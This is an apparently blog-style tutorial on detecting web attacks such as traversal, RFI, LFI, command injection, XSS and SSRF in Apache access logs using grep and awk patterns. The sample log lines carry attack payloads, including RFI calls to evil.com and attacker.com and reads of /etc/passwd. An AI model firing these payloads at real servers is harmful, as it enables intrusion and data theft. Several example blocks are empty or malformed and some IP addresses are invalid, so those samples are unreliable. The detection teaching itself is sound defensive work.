### Attack Detection on Apache Web Server

In this article, I will explain the types of web attacks and how we can detect these attacks through Apache web server access logs.

![](https://cdn-images-1.medium.com/max/800/1*gtYIO-nyJZoIwSFEi_9xQA.png)

Nowadays, web applications and sites are exposed to different types of cyber attacks. Early detection of these attacks is of great importance for the effectiveness of security measures and the continuity of the system. Apache Web Server is one of the most widely used web servers around the world and therefore it is necessary to implement the right methods for monitoring and detecting attacks.

### What are Apache Access Logs?

Apache records every HTTP request to the server in access logs. These logs contain important information such as the requesting IP address, request time, requested file or resource, HTTP method used, and status code. Access logs are the primary data source for monitoring and analyzing activities occurring in the system.

Apache access logs are usually located in the file `/var/log/apache2/access.log` (or similar). Each request line contains the following information: IP address, date-time, request type (GET, POST), requested URL, HTTP protocol, response code, and more.

### Methods That Can Be Used for Detection

### Manual Log Analysis

Suspicious activities can be searched in log files using Linux commands such as `grep` and `awk`. For example:

```
grep -iE "union|select|drop|script|alert|../|login|admin" /var/log/apache2/access.log
```

### Automatic Monitoring and Warning Systems

* **Fail2Ban:** Can block suspicious IPs according to set rules.
* **ModSecurity:** As a Web Application Firewall (WAF) running on Apache, it detects and blocks attacks in real time.
* **Log Analysis Tools:** Tools such as GoAccess and AWStats make it easier to visualize and analyze logs.

### Directory Traversal

Directory Traversal attack is a type of attack in which an attacker attempts to gain unauthorized access to upper directories or sensitive files on the web server. The goal is to obtain critical files on the server (e.g. `/etc/passwd`, configuration files).

#### Indicators of a Directory Traversal Attack

Indicators to pay attention to in Apache access logs:

* `../` or similar directory jump statements in URL parameters or request paths
* Encoded characters such as `..%2F` (URL encoded `../`)
* Attempts to access sensitive files: file names such as `/etc/passwd`, `/boot.ini`, `/windows/win.ini`
* Abnormally long URL requests or a high number of directory jump patterns
* Increase in server errors (403 Forbidden, 404 Not Found)

#### Directory Traversal Detection in Apache Access Logs

An example Apache log containing a Directory Traversal attack is given.

```
192.168.1.200 - - [01/Jun/2025:12:00:10 +0300] "GET /../../../../etc/passwd HTTP/1.1" 403 723 "-" "Mozilla/5.0"  
192.168.1.201 - - [01/Jun/2025:12:00:30 +0300] "GET /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 404 512 "-" "curl/7.68.0"  
192.168.1.202 - - [01/Jun/2025:12:01:05 +0300] "GET /admin/../../boot.ini HTTP/1.1" 403 400 "-" "Mozilla/5.0"
```

Detection can be made by running the following query on this log.

> grep -iE “\.\./|\.\.%2F|etc/passwd|boot.ini|win.ini” /var/log/apache2/access.log

---

### File Upload

A File Upload attack occurs when an attacker uploads malicious files by abusing the file upload feature of a web application. These files can often be scripts containing commands that can be executed on the web server.

Webshells are small malicious scripts that attackers can install and run on a web server. It is usually written in server-side languages ​​such as PHP, ASP, JSP. Webshell provides attackers with broad powers such as executing commands on the server, uploading/downloading files, stealing data, and creating backdoors.

The aim may be to insert malicious code into the server and take control, leak data, or disrupt the system.

#### File Upload Attack Indicators

Signs to look out for in Apache access logs:

* Requests to file upload endpoints such as `/upload`, `/uploads`, `/file-upload`, `/image-upload`
* Suspicious extensions in uploaded file names: `.php`, `.exe`, `.jsp`, `.asp`, `.phtml`, `.pl`
* Long or complex file names (e.g. `shell.php`, `cmd.jsp`, `image.jpg.php`)
* HTTP method is usually POST and content type is `multipart/form-data`
* Many files are attempted to be uploaded from the same IP in a short time.
* Attempting to run the file through suspicious GET requests after installation

#### File Upload Detection in Apache Access Logs

An example Apache log containing the File Upload attack is given.

```
192.168.1.350 - - [01/Jun/2025:23:10:45 +0300] "POST /upload HTTP/1.1" 200 512 "-" "Mozilla/5.0"  
192.168.1.350 - - [01/Jun/2025:23:11:00 +0300] "GET /uploads/shell.php HTTP/1.1" 200 1024 "-" "Mozilla/5.0"  
192.168.1.351 - - [01/Jun/2025:23:12:10 +0300] "POST /file-upload HTTP/1.1" 200 512 "-" "curl/7.68.0"
```

Detection can be made by running the following query on this log.

> grep -E “\.php|\.jsp|\.asp|\.exe|\.phtml” /var/log/apache2/access.log

---

### RFI (Remote File Inclusion)

RFI is a type of attack on web applications that allows a malicious attacker to include and run malicious files (usually PHP, JavaScript, etc.) from a remote server.

This attack is especially seen in weak applications such as PHP that use include(), require() functions directly with user input. An attacker can give the URL of a remote file as a parameter and cause the server to run malicious code.

#### Indicators of RFI Attack

It is important to pay attention to the following signs in Apache access logs:

* Remote file addresses such as `http://`, `https://` in URL or parameters
* File extensions such as `.php`, `.txt`, `.inc` in parameters
* Remote file call with parameter names such as `include=`, `file=`, `page=`, `template=`
* Abnormally long URL and complex parameter structures
* Error codes such as 500 Internal Server Error

#### RFI Detection in Apache Access Logs

An example Apache log containing an RFI attack is given.

```
192.168.1.210 - - [01/Jun/2025:12:30:10 +0300] "GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1" 500 1024 "-" "Mozilla/5.0"  
192.168.1.211 - - [01/Jun/2025:12:31:05 +0300] "GET /include.php?file=https://evil.com/malware.php HTTP/1.1" 200 2048 "-" "curl/7.68.0"  
192.168.1.212 - - [01/Jun/2025:12:32:15 +0300] "GET /template.php?template=http://attacker.com/bad.inc HTTP/1.1" 500 512 "-" "Mozilla/5.0"
```

Detection can be made by running the following query on this log.

> grep -iE “<http://|https://|include=|file=|page=|template=>" /var/log/apache2/access.log

---

### LFI (Local File Inclusion)

LFI is a type of attack that allows unauthorized inclusion and execution of local files on the server (e.g. system files, configuration files) with input received from the user in the web application.

This attack occurs especially when functions such as include(), require() are called directly with user input. The purpose is usually to access sensitive files or run commands on the server.

#### Indicators of LFI Attack

Signs to look out for in Apache access logs:

* Directory jump characters such as `../` in URL or parameters (similar to Directory Traversal)
* PHP wrapper expressions such as `php://`, `data://`, `expect://`
* System files: file names such as `/etc/passwd`, `/proc/self/environ`, `/var/log/apache2/access.log`
* Keywords for file inclusion in parameters such as `include=`, `page=`, `file=`
* Abnormally long and complex URL structures
* Error codes such as 403 Forbidden or 500 Internal Server Error

#### Detecting LFI in Apache Access Logs

An example Apache log containing an LFI attack is given.

```
192.168.1.220 - - [01/Jun/2025:13:00:10 +0300] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 403 512 "-" "Mozilla/5.0"  
192.168.1.221 - - [01/Jun/2025:13:01:25 +0300] "GET /load.php?file=php://filter/convert.base64-encode/resource=index.php HTTP/1.1" 200 1024 "-" "curl/7.68.0"  
192.168.1.222 - - [01/Jun/2025:13:02:05 +0300] "GET /view.php?include=../proc/self/environ HTTP/1.1" 403 400 "-" "Mozilla/5.0"
```

Detection can be made by running the following query on this log.

> grep -iE “\.\./|php://|data://|expect://|include=|page=|file=” /var/log/apache2/access.log

---

### Brute Force

A Brute Force attack occurs when an attacker automatically and quickly tries multiple username and password combinations to gain access to a user account or system. The goal is to gain unauthorized access by finding the correct credentials.

This attack is usually directed at login pages and occurs through automated tools.

#### Indicators of Brute Force Attack (Common Indicators)

The following signs in Apache access logs may indicate a Brute Force attack:

* Many POST (usually login) requests from the same IP address in a short time
* Repeated login attempts with different usernames or passwords
* Increased number of 401 Unauthorized or 403 Forbidden HTTP response codes
* Heavy request traffic on certain endpoints (e.g. `/login`, `/wp-login.php`, `/admin/login.php`)
* Repeating patterns in User-Agent or IP addresses

#### Brute Force Detection in Apache Access Logs

An example Apache log containing a Brute Force attack is given.

```
192.168.1.250 - - [01/Jun/2025:14:10:01 +0300] "POST /login.php HTTP/1.1" 401 530 "-" "Mozilla/5.0"  
192.168.1.250 - - [01/Jun/2025:14:10:03 +0300] "POST /login.php HTTP/1.1" 401 530 "-" "Mozilla/5.0"  
192.168.1.250 - - [01/Jun/2025:14:10:05 +0300] "POST /login.php HTTP/1.1" 401 530 "-" "Mozilla/5.0"

```

Detection can be made by running the following query on this log.

> awk ‘$7 == “/login.php” && $9 == 401 {print $1}’ /var/log/apache2/access.log | sort | uniq -c | sort -nr | head

---

### Command Injection

Command injection is a vulnerability that allows an attacker to run unauthorized commands on the server by injecting malicious operating system commands into the web application.

This attack occurs especially when user input is not validated and is passed directly to functions that execute operating system commands (e.g. system(), exec(), shell\_exec()).

The goal is to hijack the server, read or modify file content, or perform other malicious actions.

#### Command Injection Indicators

Signs to look out for in Apache access logs:

* Command separator characters such as `;`, `&&`, `|`, `` ` `` (backtick) in URL or parameters
* System command names such as `curl`, `wget`, `nc`, `bash`, `sh`, `python`
* Abnormally long or complex structures in parameters
* Increase in error (500 Internal Server Error) codes on the server side
* Requests that display or affect command output

#### Command Injection Detection in Apache Access Logs

An example Apache log containing a Command Injection attack is given.

192.168.1.231 - - [01/Jun/2025:13:31:20 +0300] "GET /exec.php?cmd=ls%20-l%20%26%26%20cat%20/etc/passwd HTTP/1.1" 500 2048 "-" "curl/7.68.0"  
192.168.1.232 - - [01/Jun/2025:13:32:05 +0300] "GET /shell.php?cmd=`whoami` HTTP/1.1" 500 512 "-" "Mozilla/5.0"
```

Detection can be made by running the following query on this log.

> grep -iE ";|&&|\\||`|curl|wget|nc|bash|sh|python" /var/log/apache2/access.log

---

### SQL Injection

SQL Injection is a type of attack in which the attacker manipulates the application's database by injecting malicious SQL commands into the web application. Aim; It could be stealing confidential information from the database, modifying or deleting data.

#### Indicators of SQL Injection

It is important to pay attention to the following signs in Apache access logs or web requests:

* **SQL commands in URL or parameters:**  
   Expressions such as `UNION SELECT`, `SELECT`, `INSERT`, `DROP TABLE`, `AND 1=1`, `` OR '1'='1'`
* **Use of abnormal characters in parameters:**  
   Single quotes `'`, double quotes `"`, semicolons `;`, comment line marks `--` or `#`
* **Abnormally long URL or parameter values:**  
   Complex and long queries
* **Server error codes:**  
   Unexpected increase in errors such as 500 Internal Server Error, 400 Bad Request
* **Repeated same parameter or query patterns:**  
   Especially experimenting with different variations

#### SQL Injection Detection in Apache Access Logs

An example Apache log containing a SQL injection attack is given.

```
192.168.1.100 - - [01/Jun/2025:10:15:42 +0300] "GET /product?id=1' OR '1'='1 HTTP/1.1" 200 1234 "-" "Mozilla/5.0"

---

### NoSQL Injection

NoSQL Injection is malicious query manipulation of NoSQL databases, similar to traditional SQL injection. It occurs in NoSQL databases such as MongoDB and CouchDB when the application does not filter user input correctly.

The aim is to gain unauthorized data access, leak data, or make changes to the database by changing the query structure.

#### NoSQL Injection Indicators

The following indicators can be detected in Apache access logs:

* JSON structure or operators in parameters: `{ "$ne": null }`, `{ "$gt": "" }`, `{ "$regex": "" }` etc.
* Abnormal or unexpected JSON strings in query parameters
* Constructs for injecting code such as `{"$where": "function() { ... }"}`
* Typical NoSQL operator expressions in URL or parameters (`$gt`, `$lt`, `$ne`, `$regex`, `$or`)
* Use of an unexpected number or structure of parameters

#### Detection of NoSQL Injection in Apache Access Logs

An example Apache log containing a NoSQL Injection attack is given.

```

Detection can be made by running the following query on this log.

> grep -iE “\$\ne|\$gt|\$lt|\$regex|\$or|\$where” /var/log/apache2/access.log

---

### XML Injection

XML Injection is an attack that occurs when malicious XML content is sent to the application as a result of inadequate validation of user input during the XML data processing phase of web applications. This attack can trick the application's XML parser, leading to unwanted operations.

For example, XML External Entity (XXE) attacks fall into this category; An attacker can cause the application to process malicious XML external sources.

#### XML Injection Indicators

Things to consider in Apache access logs:

* XML special characters and structures such as <, >, &, <!ENTITY in request parameters or POST data
* <!DOCTYPE, SYSTEM, ENTITY expressions in XML content
* Submissions of longer or more complex XML data than usual
* XML External Entity references
* Increased error codes such as 400 Bad Request or 500 Internal Server Error

#### Detection of XML Injection in Apache Access Logs

An example Apache log containing an XML Injection attack is given.

```

192.168.1.251 - - [01/Jun/2025:16:11:20 +0300] "POST /service HTTP/1.1" 500 1024 "-" "curl/7.68.0"
```

Detection can be made by running the following query on this log.

> grep -iE “<!DOCTYPE|SYSTEM|ENTITY” /var/log/apache2/access.log

---

### LDAP Injection

LDAP (Lightweight Directory Access Protocol) injection is an attack in which an attacker injects malicious input into the application's LDAP queries, gaining unauthorized access or manipulating LDAP database queries.

It occurs especially in user authentication and authorization processes, when LDAP queries are created directly with user input.

#### LDAP Injection Indicators

Signs to look out for in Apache access logs:

* LDAP special characters such as `*`, `|`, `&`, `(`, `)` in URL or parameters
* Query manipulations on parameters such as `*)(uid=*)`, `(|(uid=*))`, `(objectClass=*)`
* Filter expressions full of abnormal characters or complex
* Increase in incorrect or unsuccessful login attempts
* Multiple attempts from the same IP

```

Detection can be made by running the following query on this log.

> grep -iE “\\*\)|\|\(|&|\(|\)” /var/log/apache2/access.log

---

### Template Injection

Template Injection is the result of processing data received from the user in template engines in web applications without adequate filtering. It is a security vulnerability that occurs when malicious code is injected into the template.

By injecting malicious code into the template, an attacker can execute code on the server side, access sensitive data, or control the application.

For example, such vulnerabilities can be seen in template engines such as Jinja2 (Python), Twig (PHP), Freemarker (Java).

#### Template Injection Indicators

Signs to look out for in Apache access logs:

* Template variables and expressions such as `{{ }}`, `{% %}`, `{# #}` in URL or parameters
* Malicious code attempts such as `{{ config }}`, `{{ self }}`, `{{ ''.class.mro() }}`
* Abnormal and template engine specific syntax in parameters
* Increase in server error codes (such as 500 Internal Server Error)
* Repeated malicious requests of the same type

#### Template Injection Detection in Apache Access Logs

An example Apache log containing Template Injection attack is given.

---

### HTTP Header Injection

HTTP Header Injection is a vulnerability that allows an attacker to manipulate HTTP headers by injecting malicious data into the web application.

This attack occurs specifically if user input is not properly filtered in HTTP headers (e.g. Set-Cookie, Location).

An attacker can use this vulnerability to split HTTP responses (Response Splitting), conduct a Cross-Site Scripting (XSS) attack, or cause damage such as session hijacking.

#### HTTP Header Injection Indicators

Signs to look out for in Apache access logs:

* Presence of `\r` (carriage return), `\n` (line break) characters in URL or parameters
* End-of-line character injection in headers (e.g. `%0d`, `%0a`)
* Abnormal use of header names such as `Set-Cookie:`, `Location:` in parameters
* Increase in unexpected error or abnormal response codes from the server
* Repetition of suspicious requests of the same type

#### HTTP Header Injection Detection in Apache Access Logs

An example Apache log containing an HTTP Header Injection attack is given.

```

```

Detection can be made by running the following query on this log.

> grep -iE “%0d|%0a|\r|\n” /var/log/apache2/access.log

---

### Content Injection

Content Injection is a vulnerability that allows an attacker to inject malicious content into a web application or web page, displaying harmful or unwanted content to visitors.

This attack typically occurs when user input is not properly filtered, resulting in malicious code being injected into HTML, JavaScript, text, or other content.

Content injection may disrupt the appearance or functionality of the website and may expose users to phishing attacks or malware distribution.

#### Content Injection Indicators

Signs to look out for in Apache access logs:

* Suspicious HTML/JavaScript code fragments in URL parameters or form data
* Harmful content expressions such as `<script>`, `<iframe>`, `onerror=`, `javascript:` in parameters
* Requests containing abnormally long or complex pieces of code
* Unexpected content types or error codes from the server
* Repeated attempts of the same type of harmful content

#### Content Injection Detection in Apache Access Logs

An example Apache log containing a Content Injection attack is given.

```
192.168.1.330 - - [01/Jun/2025:22:30:10 +0300] "GET /search?q=<div style='color:red'>Hacked</div> HTTP/1.1" 200 2048 "-" "Mozilla/5.0"  
192.168.1.331 - - [01/Jun/2025:22:31:05 +0300] "POST /comment HTTP/1.1" 200 1024 "-" "curl/7.68.0"

```

Detection can be made by running the following query on this log.

> grep -E “<html|<div|<span|<table|<script|</script>” /var/log/apache2/access.log

---

### XSS (Cross-Site Scripting)

XSS is injecting malicious JavaScript or HTML code into a web application and executing that code in other users' browsers. All XSS attacks are content injection, but not all content injections are XSS. The goal is to hijack user sessions, infect malware, or mislead users. XSS attacks are divided into three:

* **Stored XSS:** Malicious code is saved in the database or persistent areas and displayed to every user.
* **Reflected XSS:** Malicious code is temporarily reflected via a URL or form.
* **DOM-based XSS:** Malicious code is executed through DOM manipulation on the user side (browser).

#### Indicators of XSS Attack

XSS flags in Apache access logs typically include:

* JavaScript or HTML tags such as `<script>`, `</script>`, `alert(`, `onerror=`, `javascript:` in URL or parameters
* Encoded HTML characters: `%3C` ( < ), `%3E` ( > ), `%22` ( " ), `%27` ( ' )
* Abnormally long and complex character strings in parameters

Example parameters:  
q=<script>alert(‘XSS’)</script>  
search=%3Cimg%20src=x%20onerror=alert(1)%3E

#### XSS Detection in Apache Access Logs

An example Apache log containing an xss attack is given.

```
192.168.1.150 - - [01/Jun/2025:11:20:35 +0300] "GET /search?q=<script>alert('XSS')</script> HTTP/1.1" 200 1024 "-" "Mozilla/5.0"  
192.168.1.151 - - [01/Jun/2025:11:21:12 +0300] "GET /profile?name=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1" 200 2048 "-" "Mozilla/5.0"
```

Detection can be made by running the following query on this log.

> grep -iE “<script|alert|onerror|javascript:” /var/log/apache2/access.log

---

### **SSRF (Server-Side Request Forgery)**

SSRF is a vulnerability that allows an attacker to send malicious requests to the target server itself or to other internal systems he can access.

The attacker manipulates input that the application receives from the user, such as the URL or IP address, causing the server to access unauthorized resources. In this way, it can infiltrate systems in the internal network, access sensitive data or perform other attacks on the system.

#### SSRF Indicators

Signs that can be observed in Apache access logs:

* Suspicious IP addresses or localhost addresses in URL parameters (`127.0.0.1`, `localhost`, `169.254.x.x`, `10.x.x.x`, `192.168.x.x`)
* Requests to unexpected or non-application URLs
* Frequent requests to the server's own IP address or private network addresses
* Use of long URL parameters or intra-URL encoding
* Request attempts to many different targets from the same IP

#### SSRF Detection in Apache Access Logs

An example Apache log containing an SSRF attack is given.

```
192.168.1.300 - - [01/Jun/2025:20:15:10 +0300] "GET /fetch?url=http://127.0.0.1/admin HTTP/1.1" 200 1024 "-" "Mozilla/5.0"  
192.168.1.301 - - [01/Jun/2025:20:16:05 +0300] "GET /api/proxy?target=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200 512 "-" "curl/7.68.0"
```

Detection can be made by running the following query on this log.

> grep -iE “127\.0\.0\.1|localhost|169\.254|10\.|192\.168” /var/log/apache2/access.log

### CSRF (Cross-Site Request Forgery)

CSRF is a type of attack that allows a malicious site to send a request on behalf of the user to a web application that the user is authorized to do. Requests are made without the user's awareness, using their privileges for malicious purposes.

For example, when a user clicks on a malicious link or submits a form while logged in, the attacker's desired actions can occur.

#### CSRF Indicators

Although it is difficult to detect directly in Apache access logs, indirect indicators can be:

* Unexpected POST or GET requests
* Abnormal number of transactions for different sessions from the same IP or user agent
* Abnormal and recurring requests for specific endpoints
* Requests do not have a referrer title or are suspicious
* Operations requiring unexpected authorization for logged-in users.

#### CSRF Detection in Apache Access Logs

An example Apache log containing a CSRF attack is given.

```
192.168.1.310 - - [01/Jun/2025:21:10:15 +0300] "POST /account/change-email HTTP/1.1" 200 512 "-" "Mozilla/5.0"  
192.168.1.310 - - [01/Jun/2025:21:10:17 +0300] "POST /account/change-email HTTP/1.1" 200 512 "http://malicious-site.com" "Mozilla/5.0"
```

Detection can be made by running the following query on this log. Although it is difficult to definitively detect a CSRF attack directly from Apache logs, log analysis can be performed for Referer checking and detection of abnormal request behavior.

> grep -E “POST /critical-endpoint” /var/log/apache2/access.log | grep “Referer: http”

### IDOR (Insecure Direct Object Reference)

IDOR is a vulnerability where a user can directly access another user's data or objects without authorization. If web applications use object references (e.g. file names, user IDs, order numbers) directly and without verification in URL parameters when accessing resources (files, user data, records, etc.), the attacker can access others' data by changing these references.

#### IDOR Indicators

Signs to look out for in Apache access logs:

* ID or file names that can be changed in URL parameters and contain a direct object reference (`user_id=123`, `file=report45.pdf`)
* Attempts to access IDs of different users from the same IP or user agent
* Use of abnormal or unexpected object numbers in URL parameters
* Successive access attempts to different objects in a short period of time
* Unauthorized access requests in cases where session or authentication controls are weak

#### IDOR Detection in Apache Access Logs

An example Apache log containing an IDOR attack is given.

```
192.168.1.370 - - [02/Jun/2025:00:10:05 +0300] "GET /profile?user_id=100 HTTP/1.1" 200 2048 "-" "Mozilla/5.0"  
192.168.1.370 - - [02/Jun/2025:00:10:20 +0300] "GET /profile?user_id=101 HTTP/1.1" 200 2048 "-" "Mozilla/5.0"  
192.168.1.370 - - [02/Jun/2025:00:10:35 +0300] "GET /profile?user_id=102 HTTP/1.1" 200 2048 "-" "Mozilla/5.0"
```

Detection can be made by running the following query on this log.

> grep “GET /profile?user\_id=” /var/log/apache2/access.log

### Open Redirect

Open Redirect is a vulnerability that occurs when a web application misuses parameters to redirect users to another URL. The attacker uses these vulnerabilities to redirect users to malicious or fraudulent sites.

This type of attack is a common means of phishing attacks; While users think they are clicking on a reliable site, they are actually directed to a malicious site.

#### Open Redirect Indicators

Signs to look out for in Apache access logs:

* Parameters for redirection purposes such as `redirect=`, `url=`, `next=`, `return=`, `dest=`, `continue=` in URL parameters
* These parameters include full or partial other domain addresses (e.g. `http://malicious.com`).
* Attempts to redirect from the same IP to different malicious URLs
* Entering different external URLs into the same parameter in a short time
* Suspicious redirects on requests with HTTP status code 3xx (301, 302, 307)

#### Open Redirect Detection in Apache Access Logs

An example Apache log containing an Open Redirect attack is given.

```
192.168.1.380 - - [02/Jun/2025:00:45:10 +0300] "GET /login?redirect=http://malicious.com HTTP/1.1" 302 512 "-" "Mozilla/5.0"  
192.168.1.381 - - [02/Jun/2025:00:46:05 +0300] "GET /index?url=https://phishing-site.com HTTP/1.1" 302 512 "-" "Mozilla/5.0"
```

Detection can be made by running the following query on this log.

> grep -E “redirect=|url=|next=|return=|dest=|continue=” /var/log/apache2/access.log | grep -E “<http://|https://>"

Although Apache web servers are one of the most used and reliable server software worldwide, they can always be vulnerable to various web attacks. Therefore, it is critical to regularly analyze access logs to detect and prevent possible attacks.

Abnormal requests, suspicious parameters and unexpected file accesses that can be seen in access logs are important clues that the web server is being targeted. Therefore, effective monitoring of logs should be done. It should be supported by automatic analysis tools, security systems and firewalls; user input must be filtered and security updates must be applied regularly.

As a result, intrusion detection in Apache web server is one of the cornerstones of building a strong security posture. Proactive approaches both prevent data loss and ensure system continuity. Security is not just a technology, it is a process that requires constant monitoring and improvement.
